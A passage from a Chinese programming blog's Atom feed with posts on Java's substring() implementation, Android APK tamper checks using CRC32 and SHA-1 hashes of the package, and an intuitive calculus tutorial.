src="http://www.meng.uno/images/substring/substring_jdk.png" alt="Substring()实现版本一"></p><p>这样一来，<strong><em>缺点</em></strong>就比较明显：当原始字符串比较长，而截取的子串比较短时，在后续的使用中就会浪费大量的空间。</p><h3 id="jdk7-版本">JDK7+版本</h3><p>在上一个版本基础上，这个方法进行了改进，每次使用这个方法都会新建一个string对象，并将其返回。</p><p><img src="http://www.meng.uno/images/substring/substring_jdk7.png" alt="Substring()实现版本二"></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/f3057e6c/">http://home.meng.uno/articles/f3057e6c/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      写过Java的人应该都用过substring(int bedinIndex, int endIndex)方法。我发现这个简单的方法在实现上居然经过了一次大的变革。

substring()的用途
代码:

1
2
3


String origin = &quot;asdfg&quot;; 
origin = origin.substring(1,3);
System.out.println(origin);


输出:

1


sd


我们发现它能将原始字符串中从下标为beginIndex到endIndex-1之间的子串取出。那它是怎么实现的呢？

substring()的实现
Java中的字符串有三个域：
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="Substring()" scheme="http://home.meng.uno/tags/Substring/"/>
    
  </entry>
  
  <entry>
    <title>Android安全之apk完整性校检</title>
    <link href="http://home.meng.uno/articles/9b5f779d/"/>
    <id>http://home.meng.uno/articles/9b5f779d/</id>
    <published>2018-02-04T06:08:38.000Z</published>
    <updated>2020-12-02T01:40:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1>crc32</h1><p>全称是“Cyclic Redundancy Check”，中文名是“循环冗余码”。</p><blockquote>  <p>它的计算是非常非常非常严格的。严格到什么程度呢？你的程序只要被改动了一个字节（甚至只是大小写的改动），它的值就会跟原来的不同。</p></blockquote><p>在apk中，反编译后恶意的篡改代码重新打包主要集中在dex文件中，所以可以通过获取dex文件的crc32值来观察dex文件是否被篡改过了。代码：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 获取当前apk的crc32值</span><br><span class="line"> * @return</span><br><span class="line"> */</span><br><span class="line">public static Long getCrc32(Context context)&#123;</span><br><span class="line">    String apkPath = ApkPathUtils.getApkPath(context);</span><br><span class="line">    ZipFile zipfile = null;</span><br><span class="line">    ZipEntry dexentry = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        zipfile = new ZipFile(apkPath);</span><br><span class="line">        dexentry = zipfile.getEntry(&quot;classes.dex&quot;);</span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return dexentry.getCrc();</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>上文代码中的工具类ApkPathUtils：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public class ApkPathUtils &#123;</span><br><span class="line"></span><br><span class="line">    public static String getApkPath(Context context)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            PackageInfo packageInfo = context.getPackageManager().getPackageInfo(context.getPackageName(),PackageManager.GET_META_DATA);</span><br><span class="line">            ApplicationInfo applicationInfo = packageInfo.applicationInfo;</span><br><span class="line">            return applicationInfo.publicSourceDir; // 获取当前apk包的绝对路径</span><br><span class="line">        &#125; catch (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>看<code>getCrc32(Context context)</code>这个方法，只是给<code>ZipFile</code>这类塞了一个当前<code>apk</code>包的绝对路径就可以了，而这个当前<code>apk</code>的绝对路径可以通过<code>PackageInfo</code>拿到，记得加上读外部存储卡的权限。当然，5.0以后的权限另做处理。</p><p>获取到crc32值之后一般有两种处理方式：</p><ol>  <li>把crc32值放在本地的string.xml文件中，在运行时获取比对，如果与.xml获取到的crc32值不同，则说明代码有变动，则apk已经被修改。注意：不要放在raw，asset中的文件。只有不牵扯javad代码的修改，放在本地的任意位置都行。</li>  <li>将获取到的crc32值加密送到后台，解密与后台保存的crc32值进行比对。通过接口获取比对结果，判断apk是否被修改过。</li></ol><blockquote>  <p>注意：校验的代码最好加上版本的判断，只有在release版本的时候才会去校验，debug模式的时候不做判断，因为在debug模式的时候也判断的话，你就没法调试代码了，永远在修改，获取到的值永远不同</p></blockquote><h1>apk Hash值判断</h1><blockquote>  <p>MD5Hash算法的”数字指纹”特性，使它成为目前应用最广泛的一种文件完整性校验。</p></blockquote><p>先看校验方法：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>      </td>      <td class="code">        <pre><span class="line">/**</span><br><span class="line"> * 获取当前apk包的hash值</span><br><span class="line"> * @return</span><br><span class="line"> */</span><br><span class="line">public String getHash(Context context)&#123;</span><br><span class="line">    MessageDigest msgDigest = null;</span><br><span class="line">    String apkPath = ApkPathUtils.getApkPath(context);</span><br><span class="line">    FileInputStream fis = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        msgDigest = MessageDigest.getInstance(&quot;SHA-1&quot;);</span><br><span class="line">        byte[] bytes = new byte[1024];</span><br><span class="line">        int byteCount;</span><br><span class="line">        fis= new FileInputStream(new File(apkPath));</span><br><span class="line">        while ((byteCount = fis.read(bytes)) &gt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">            msgDigest.update(bytes, 0, byteCount);</span><br><span class="line">        &#125;</span><br><span class="line">        BigInteger bi = new BigInteger(1, msgDigest.digest());</span><br><span class="line">        return bi.toString(16);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;finally &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            fis.close();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return &quot;&quot;;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>从上面代码可以看出，就是对apk文件的流进行了sha-1，并转成16进制，获取到的hash值。</p><blockquote>  <p>与 DEX 校验不同 APK 检验必须把把计算好的 Hash 值放在网络服务端，因为对 APK 的任何改动都会影响到最后的 Hash 值。</p></blockquote><p>当你获取到hash值后放在本地，这时候apk的hash值已经改变，所以你永远获取不到一个准确版本的hash值，所以获取后只能放在服务端进行校验，校验的方式与crc32在服务端的校验是相同的，不再赘述。</p><p>crc32,apk-hash值都可以通过dos命令行获取。</p><p>当然上述的保护方式容易被暴力破解, 完整性检查最终还是通过返回 <code>true/false</code> 来控制后续代码逻辑的走向,如果攻击者直接修改代码逻辑,完整性检查始终返回 <code>true</code>,那这种方法就无效了当然你可以把校验逻辑放进<code>.so</code>文件，加大破解的难度。但还是不能完全保证安全，而且遇到<code>apk</code>动态加载，会自动创建<code>dex</code>文件的情况，或者应用加固.</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/9b5f779d/">http://home.meng.uno/articles/9b5f779d/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      crc32
全称是“Cyclic Redundancy Check”，中文名是“循环冗余码”。

它的计算是非常非常非常严格的。严格到什么程度呢？你的程序只要被改动了一个字节（甚至只是大小写的改动），它的值就会跟原来的不同。

在apk中，反编译后恶意的篡改代码重新打包主要集中在dex文件中，所以可以通过获取dex文件的crc32值来观察dex文件是否被篡改过了。代码：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16


/**
 * 获取当前apk的crc32值
 * @return
 */
public static Long getCrc32(Contex
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
      <category term="Safty" scheme="http://home.meng.uno/tags/Safty/"/>
    
      <category term="apk" scheme="http://home.meng.uno/tags/apk/"/>
    
  </entry>
  
  <entry>
    <title>详述微积分</title>
    <link href="http://home.meng.uno/articles/93227351/"/>
    <id>http://home.meng.uno/articles/93227351/</id>
    <published>2018-02-04T02:29:41.000Z</published>
    <updated>2020-12-02T01:39:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1>1. 微积分（Calculus）引言</h1><p><strong>微积分回忆</strong></p><ul>  <li>求导公式</li>  <li>乘积法则</li>  <li>链式法则</li>  <li>隐函数求导</li>  <li>积分、微分的互逆关系</li>  <li>泰勒级数</li>  <li>…</li></ul><p><strong>微积分的三个中心思想：</strong></p><ol>  <li>积分</li>  <li>微分</li>  <li>积分与微分（导数）的互逆</li></ol><p><strong>（几位）微积分之父</strong></p><ul>  <li>发现微积分：巴罗（Barrow）、牛顿（Newton）、莱布尼茨（Leibniz）</li>  <li>给出严格定义：柯西（Cauchy）、魏尔施特拉斯（Weierstrass）</li></ul><h2 id="1-1-推导圆的面积-积分的直观理解">1.1. 推导圆的面积 - 积分的直观理解</h2><p>圆的面积公式：</p><p><a href="http://www.codecogs.com/eqnedit.php?latex=Aera=%5Cpi&amp;space;R%5E2" target="_blank" rel="noopener"><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180625144700.png" alt=""></a></p><p><strong>如何从积分的角度推导出圆的面积公式？</strong></p><p>不同的划分方法会带来不同的积分公式，下面考虑将圆划分为大量的同心圆环，这种方法保留了圆的对称性。</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180625150305.png" alt=""></p><p>考虑其中一个环的面积，可以将其看做一个“类矩形”</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180625150437.png" alt=""></p><p>虽然这不是标准的矩形，但只要<code>dr</code>越小，它就越接近。它的面积可表示为：</p><p><a href="http://www.codecogs.com/eqnedit.php?latex=area=2%5Cpi&amp;space;r,dr" target="_blank" rel="noopener"><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180625205349.png" alt=""></a></p><p>于是，圆的面积可以看作是这一系列矩形面积的叠加。</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180625151928.png" alt=""></p><p>这部分面积的求和可以等价于求“<strong>函数<code>y = 2πr</code>图像在区间<code>[0, R]</code>下的面积</strong>”。</p><p>这个推导的过程其实可以看作是对函数<code>y = 2πr</code>在<code>[0, R]</code>下的积分。</p><h2 id="1-2-积分与导数">1.2. 积分与导数</h2><p>直观来说，对函数<code>f(x)</code>在<code>[a, b]</code>上<strong>积分</strong>就是求函数<code>f(x)</code>在区间<code>[a,b]</code>下的图像与坐标轴包围的面积。记作：</p><p><a href="http://www.codecogs.com/eqnedit.php?latex=%5Cint_%7Ba%7D%5E%7Bb%7Df(x)dx" target="_blank" rel="noopener"><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180625205043.png" alt=""></a></p><blockquote>  <p>这实际上是<strong>定积分</strong>的概念，此外还有不定积分。</p></blockquote><p>如果是其他图像，比如抛物线，该怎么求这部分的面积呢？</p><p>能不能找到一个函数 <code>A(x)</code> 表示 <code>0</code> 到 <code>x</code> 之间函数图像下的面积？——这个函数 <code>A(x)</code> 就是该函数的<strong>积分</strong>（函数）。</p><blockquote>  <p>这里强调 <code>0</code> 到 <code>x</code> 之间，是为了使问题具有实际意义</p></blockquote><p>以抛物线 <code>f(x)=x^2</code> 为例。类似的，我们可以将这块区域划分成一系列细长的矩形。</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180625160257.png" alt=""></p><p>将 <code>x</code> 增加 <code>dx</code>，增加的面积可以看做是一个长<code>f(x)</code>、宽<code>dx</code>的矩形，只要<code>dx</code>越小，这条窄带就越接近矩形。</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180625162938.png" alt=""></p><p>把这部分面积记作 <code>dA</code>，表示面积的微小变化（difference in Area）</p><p>通过这个矩形，可以得到 <code>A</code>、<code>f(x)</code> 与 <code>dx</code> 之间的关系：</p><p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180625202144.png" alt=""></p><p>这里引出了微积分中另一个重要的概念——<strong>导数</strong>。<code>dA/dx</code> 就是 “A 的导数”</p><blockquote>  <p>更严格的说法是：&quot;A 的导数&quot;是“当 <code>dx → 0</code> 时，<code>dA/dx</code> 所趋向的值”。（下一节会讨论导数的定义）</p>  <p>一般不会刻意区分<strong>导数</strong>和<strong>导数函数</strong>的区别，都统称为<strong>导数</strong>，具体含义视语境而定；同样，积分也是如此。</p></blockquote><p>导数是解决积分问题的关键——积分需要还原出某个导数原本的函数——如果你能熟练的计算导数，那么你也能解决这个问题。</p><p>积分与导数之间的这种互相转化的关系，也就是“某个图像下方面积函数的导数能够还原出定义这个图像的函数”，就叫做<strong>微积分基本定理</strong>。该定理表明，“在某种意义上”，两者互为逆运算。</p><h1>2. 导数（Derivative）的意义</h1><h2 id="2-1-瞬时变化率-引起的歧义-导数的悖论">2.1. “瞬时变化率”引起的歧义——导数的悖论</h2><p>“瞬时变化率”的歧义——只有在不同的时间点之间，变化才能发生；而将时间限制在某个瞬间点的时候，变化也就不存在了。</p><p>考虑这个示例：一辆车从 A 点起，先加速，再减速，至 100 米外的 B 点停下，整个过程花费 10 秒。</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180626114634.png" alt=""></p><p>把车速的图像加入其中，可以发现：两者存在着某种联系：其中之一改变的话，也会引起另一个发生变化。</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180626111415.png" alt="">  <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180626112123.png" alt=""></p><p>直觉上，速度越大，距离-时间函数的图像也越陡峭，意味着车在单位时间内移动的距离更长</p><p><strong>速度的大小是如何随着距离-时间函数的变化而变化的？——“瞬时”速度的矛盾</strong>：</p><ul>  <li>    <p>在绘制速度图像的时候，需要给每个单独的时间点关联一个速度值，但是计算速度却需要两个时间点上的距离。</p>  </li>  <li>    <p>记时间差为 <code>dt</code>，距离差为 <code>ds</code>，那么这段时间内的速度就能用 <code>ds/dt</code> 表示</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180626111112.png" alt=""></p>    <blockquote>      <p>当年的微积分创始人们也经历了同样的思维冲突。</p>    </blockquote>  </li>  <li>    <p>换言之，速度只有在一段会时间内的才有意义；“瞬时”的说法会带来矛盾</p>  </li>  <li>    <p>实际的做法是：会选取一个很小的 <code>dt</code> 值，然后把 <code>ds/dt</code> 看做是这个瞬间的速度。</p>  </li></ul><h2 id="2-2-导数的定义与计算">2.2. 导数的定义与计算</h2><p><strong>导数的定义</strong></p><ul>  <li>    <p>在纯数学领域，<strong>导数</strong>不是 <code>dt</code> 为某个具体值时 <code>ds/dt</code> 的值 ，而是当 <code>dt</code> 的值<strong>无限逼近 0 时</strong>这个比值的<strong>极限</strong>。</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180627210310.png" alt=""></p>  </li>  <li>    <p>从图像的角度，（某一点的）导数有一个直观的含义：就是经过图像上该点切线的斜率。</p>  </li>  <li>    <p>注意：这里的 <code>dt</code> 不是“无穷小”，也不是 0；它永远是一个有限小的量，接近 0 而不是 0。</p>    <blockquote>      <p>这种说法在试图规避“瞬时”带来的矛盾，使“某个时间点的变化率”有意义。</p>    </blockquote>  </li></ul><p><strong>导数的计算</strong></p><ul>  <li>    <p>抛开求导公式，先来看一下面对一个实际的问题，该如何求解（在某一点处的）导数。</p>  </li>  <li>    <p>对于 <code>s(t)=t^3</code> 在 <code>t=2</code> 处的导数，根据导数的定义，有</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180626200536.png" alt=""></p>  </li>  <li>    <p>当 <code>dt</code> 趋向 0 时，后两项也会趋于 0，进而消去。代入 <code>t=2</code> 可以得到在该点处的导数为 12</p>  </li>  <li>    <p>更一般的，称 <code>s'(t) = 3*t^2</code> 为 <code>s(t) = t^3</code> 的<strong>导函数</strong>。</p>  </li></ul><blockquote>  <p>对于常见的函数，有一系列总结出的<strong>求导公式</strong>可以快速计算（下一节会演示如何从几何的角度来推导这些公式）</p></blockquote><p><strong>导数的含义是“变化率的最佳近似”</strong></p><ul>  <li>回顾之前关于距离-速度的示例，思考这个问题：当 <code>t=0</code> 时，车在不在移动？</li>  <li>一方面，利用导函数公式可以得到 <code>t=0</code> 时的速度为 0——这似乎在说“车没有移动”；另一方面，如果车在 0 时刻没有移动，那么它是何时开始移动的？——关键在于这个问题本身就是没有意义的。</li>  <li>因为<strong>导数</strong>并不是用来测量“瞬时变化”的。</li>  <li><code>t=0</code>点的导数为 0 的真正含义是指“在第 0 秒附近，车速的<strong>最佳近似</strong>为 0 米/秒”——换句话说，就是当时间间隔 <code>dt</code> 越来越小时，表示速度的比值 <code>ds/dt</code> 就越趋向于 0——这并不表示车在 0 时刻就是静止的，只能说它此时的速度近似于 0.</li></ul><h1>3. 用几何来求导</h1><p>为什么导数很重要？——当需要使用微积分来解决现实中的实际问题时，需要将其抽象成各种代表性的函数来描述；而如果能掌握这些抽象函数的变化率，那你就学会了这门可以精准描述事物变化率的语言。</p><p><strong>从几何的角度看“微小变化量”</strong></p><p>以 <code>f(x) = x^2</code> 为例：</p><ul>  <li>    <p>从坐标轴上看，<code>x^2</code> 的图像是一条抛物线，我们已经知道，导数可以描述为切线的斜率</p>  </li>  <li>    <p>此外，<code>x^2</code> 还有另一个更直接的含义：长为 <code>x</code> 的正方形的面积。</p>  </li>  <li>    <p>假如给边长 <code>x</code> 一个微小的增量 <code>dx</code>，那么正方形的增量（变化量）是多少？</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180626211449.png" alt=""></p>  </li>  <li>    <p>应该时刻记住的 <code>dx</code> 是一个微小的量——这意味着你可以<strong>忽略所有次数高于 1 的 <code>dx</code> 项</strong>——换言之，一个微小量的平方（或更高次方）是一个可以忽略的变化量</p>  </li>  <li>    <p>由此，可以得到：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180626212536.png" alt=""></p>  </li>  <li>    <p>上一节给出了 <code>f(x) = x^3</code> 导数的代数推导过程，这里也可以作为立方体体积来用几何的方式推导。</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180626213324.png" alt=""></p>  </li></ul><p><strong>负的变化量</strong></p><ul>  <li>    <p>上述两个例子的变化量都是增量（正值），但实际上<strong>变化量也可能是负值</strong>，比如 <code>f(x) = 1/x</code>——考虑这样一个特殊的矩形，长 <code>x</code>，宽 <code>1/x</code>，它的面积恒为 1.</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180626221601.png" alt=""></p>    <blockquote>      <p>注意：这里的变化量不再是矩形的面积了，而是<strong>矩形的高</strong></p>    </blockquote>  </li>  <li>    <p>通过简单的几何知识，可知矩形<strong>高</strong>的变化量为：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180626223957.png" alt=""></p>  </li>  <li>    <p>从而得到 <code>1/x</code> 的导数为：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180626224325.png" alt=""></p>  </li></ul><p><strong>幂函数的导数</strong></p><ul>  <li>    <p>以上 <code>x^2</code>、<code>x^3</code> 和 <code>x^-1</code> 都遵循了幂函数的求导公式：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180626213915.png" alt=""></p>  </li>  <li>    <p>思考一下为什么这个公式也适用于 2 和 3 以外的指数——求导的一个关键点在于很大一部分项因为包含 <code>dx</code> 的高次幂，可以被忽略——因此有</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180626214855.png" alt=""></p>  </li>  <li>    <p>当指数小于 0 时，会更复杂一些——比如 <code>x^-2</code> 可以考虑一个边长为 <code>√x</code> 的正方形。</p>  </li></ul><p>大多数时候，我们都有合适的求导公式来使用，但是以上利用几何求导的过程能锻炼我们借助<strong>微小变化量</strong>来考虑的导数的能力。</p><p><strong>三角函数的导数</strong></p><ul>  <li>    <p>正弦函数的定义</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627100028.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627103330.png" alt=""></p>    <ul>      <li><code>θ=0.8</code> 表示单位圆弧长为 <code>0.8</code> 时对应的角度为 <code>θ</code>（单位圆的周长为 <code>2π</code>）</li>      <li><code>sin(θ)</code> 表示此时该点距离 x 轴的高度（可能为负）</li>      <li>当 <code>θ</code> 增加时，<code>sin(θ)</code> 的值会在 -1 到 1 之间上下摆动</li>    </ul>  </li>  <li>    <p><code>sin(θ)</code> 当 <code>θ</code> 增加时的微小变化量</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627104200.png" alt=""></p>    <ul>      <li>在近似的观点下，应该有这样的直觉——可以把那一段微小的圆弧<code>dθ</code>看作是直线</li>    </ul>  </li>  <li>    <p>根据三角函数的定义，有</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180627104751.png" alt=""></p>  </li></ul><h1>4. 直观理解链式法则</h1><p><strong>求导公式概览（3）</strong>：</p><ul>  <li>函数的和/差——加法法则</li>  <li>函数的积/商——乘法法则</li>  <li>复合函数的求导法则</li></ul><h2 id="4-1-加法法则">4.1. 加法法则</h2><p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180627113753.png" alt=""></p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627111545.png" alt=""></p><blockquote>  <p>加法法则比较简单，可以在坐标轴中展示</p></blockquote><h2 id="4-2-乘法法则">4.2. 乘法法则</h2><p>“左乘<strong>右导</strong> + 右乘<strong>左导</strong>”：</p><p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180627154921.png" alt=""></p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627114343.png" alt=""></p><blockquote>  <p>在数学中，如果你要处理两项的乘积，用<strong>面积</strong>来理解会更方便</p></blockquote><h2 id="4-3-复合函数的求导法则-链式法则">4.3. 复合函数的求导法则——链式法则</h2><p><strong>链式法则</strong>：</p><p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180627160852.png" alt="">  <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627155759.png" alt="">  <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627155845.png" alt=""></p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627155928.png" alt="">  <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627160125.png" alt=""></p><blockquote>  <p>链式法则的表达式在说：看看输出值 g 的微小变化除以 h 的微小变化是多少（h 是要带入函数 g 中的值）；然后乘以 h 微小变化与 x 微小变化的比值</p></blockquote><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627161532.png" alt=""></p><blockquote>  <p>这些 <code>dh</code> 最终会被消去，结果就是输出值 g 的微小变化与输入值 x 的微小变化的比值</p>  <p><code>dh</code> 的消去并不只是符号上的技巧，而是真实反映出在求导时，各微小变化量发生了什么（？）</p></blockquote><p><strong>了解这些求导法则 != 灵活的使用它们</strong></p><h1>5. 指数函数的导数——自然常数 e 的定义</h1><p><strong>从<code>2^t</code>开始</strong>：</p><ul>  <li>    <p>根据导数的定义，有</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180627205326.png" alt=""></p>  </li>  <li>    <p>当 <code>dt → 0</code> 时，<code>h</code> 趋向于一个常数 <code>0.6931...</code></p>  </li>  <li>    <p>也就是说，<code>2^t</code> 图像上各点处<strong>切线的斜率 = 该点的函数值 * 一个常数</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627210731.png" alt=""></p>    <blockquote>      <p>原视频对 <code>2^t</code> 赋予了一些实际意义（质量）来说明其<strong>变化量与自身成比例</strong></p>    </blockquote>  </li>  <li>    <p>类似的，<code>3^t</code> 也存在这样一个 <code>h=1.0986...</code>；<code>8^t</code> 则是 <code>h=2.0794...</code></p>  </li>  <li>    <p>注意到，<code>8^t</code> 的 <code>h</code> 大概是 <code>2^t</code> 的三倍，而 <code>8^t = 2^{3t}</code></p>  </li></ul><p><strong>是否存在某个数，使 <code>h</code> 恰为 <code>1</code>？——这个数就是自然常数 <code>e</code></strong></p><ul>  <li>    <p>不要问为什么当 <code>e^t</code> 时，<code>h=1</code>；因为 <code>e</code> 就是如此定义的。</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627212338.png" alt=""></p>    <blockquote>      <p>和“为什么 π 正好等于圆的周长比直径”一样，π 就是这么定义的。</p>      <p>自然常数不是完全这样发现的，但过程类似</p>    </blockquote>  </li></ul><p><strong>指数函数的导数</strong></p><ul>  <li>    <p>有了自然常数 <code>e</code> 以及链式法则，就可以求出其他指数函数的导数了</p>  </li>  <li>    <p>根据指数函数的性质与链式法则，有</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180627213245.png" alt=""></p>  </li>  <li>    <p>事实上，在微积分中，指数函数基本都是以 <code>e^ct</code> 的形式出现的，很少会直接使用 <code>c^t</code> 的形式</p>  </li></ul><p><strong>为什么称 <code>e</code> 为自然常数？</strong></p><ul>  <li>    <p>现实世界中，很多自然现象里的<strong>变化率</strong>与<strong>变化量</strong>是成正比的</p>  </li>  <li>    <p>比如：在室温环境下，热水变凉的速率与水和房间的温差成正比（或者说，温差的变化率与温差本身成正比）</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180627213951.png" alt=""></p>  </li>  <li>    <p>尽管指数函数有多种写法，但是将其表达为以 <code>e</code> 为底的幂函数是非常自然的。</p>  </li>  <li>    <p>因为 <code>e</code> 有着非常自然的含义，它就是变化率与数量本身的比例系数。（？）</p>  </li></ul><h1>6. 隐函数求导</h1><p><strong>什么是隐函数？</strong></p><ul>  <li>如果方程 <code>F(x,y)=0</code> 能确定 y 是 x 的函数，那么称这种方式表示的函数是隐函数；</li>  <li>直观来说，就是满足某种关于变量 x 和 y 的关系的、所有 <code>(x, y)</code> 点的集合，相应的曲线就是“隐函数曲线”。</li></ul><p><strong>示例 1：圆上某一点切线的斜率</strong></p><ul>  <li>    <p>圆的方程就是一个隐函数，比如 <code>x^2 + y^2 = 5^2</code>，下面需要求圆上一点的斜率（不考虑几何方法）</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628104522.png" alt=""></p>  </li>  <li>    <p>因为这里的曲线并不是一个函数图像，所以不能单纯对其求导——它不存在变量 x 的微小变化对函数值 y 的微小变化</p>  </li>  <li>    <p>当然，如果我们的目标只是求 <code>dy/dx</code>，那么对等式两边同时求导可以解决：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628110309.png" alt=""></p>  </li>  <li>    <p><strong>为什么这么做？</strong></p>  </li></ul><p><strong>示例 2：相关变化率</strong></p><ul>  <li>    <p>这是一个更实际的例子：开始时，梯子上端距地面 4m(<code>y=4</code>)，下端距墙 3m(<code>x=3</code>)。如果梯子的上端以 <code>1 m/s</code> 的速度下滑，那么下端左滑的速度是多少？</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628110920.png" alt=""></p>  </li>  <li>    <p>等式的左边可以看做是一个关于时间 <code>t</code> 的函数，于是对<strong>表达式左边</strong>求导的含义相当于在问“经过短暂的时间 <code>dt</code>，<code>y</code> 会减少一点，<code>x</code> 会增加一点，那么整体的变化量是多少？”，而<strong>表达式右边</strong>告诉我们这个变化量为 <code>0</code>。</p>  </li>  <li>    <p>带入 <code>x(t)=3, y(t)=4, dy/dt=1</code>，就能求出 <code>dx/dt</code> 了。</p>  